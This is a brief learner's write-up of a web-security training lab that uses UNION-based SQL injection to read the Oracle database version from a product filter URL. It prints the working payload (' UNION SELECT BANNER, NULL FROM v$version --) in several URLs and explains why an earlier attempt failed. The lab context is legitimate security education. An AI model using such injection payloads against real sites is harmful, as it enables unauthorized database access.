# Lab: SQL injection attack, querying the database type and version on Oracle

*5/13/2026*

**URL:**
https://0a8300c4033cd372802f9e4700590073.web-security-academy.net/ 

**Filtered URL:**
https://0a8300c4033cd372802f9e4700590073.web-security-academy.net/filter?category=Accessories 

**Infected URL:**
https://0a8300c4033cd372802f9e4700590073.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+BANNER,+NULL+FROM+v$version– 

**Notes:**
https://0a8300c4033cd372802f9e4700590073.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+BANNER+NULL+FROM+v$version– 
https://0a8300c4033cd372802f9e4700590073.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+BANNER,+NULL+FROM+v$version– 

Above are 2 URLs, one is working, one is not. The first one is not working because the query is wrong after the ``UNION SELECT``. The ``BANNER NULL`` needs to instead be ``BANNER, NULL`` with that , being very important. Even with that though, it doesn’t work because what I didn’t notice when solving the lab and trying to find the difference between the working URL and my URL, is that my text editor changed the two - signs to one –. 

So, the lab contained a URL capable of being infected through SQL injections, and by adding the ‘ to close the original query, any query could be added as a “UNION SELECT”. The lab wanted to know what version of Oracle SQL was being run, so the query after the initial URL became ``‘ UNION SELECT BANNER, NULL FROM v$version --`` with ``v$version`` being the key way for finding the version of Oracle SQL. It is different for every version of SQL though (mysql server, mysql, postgresql, etc).
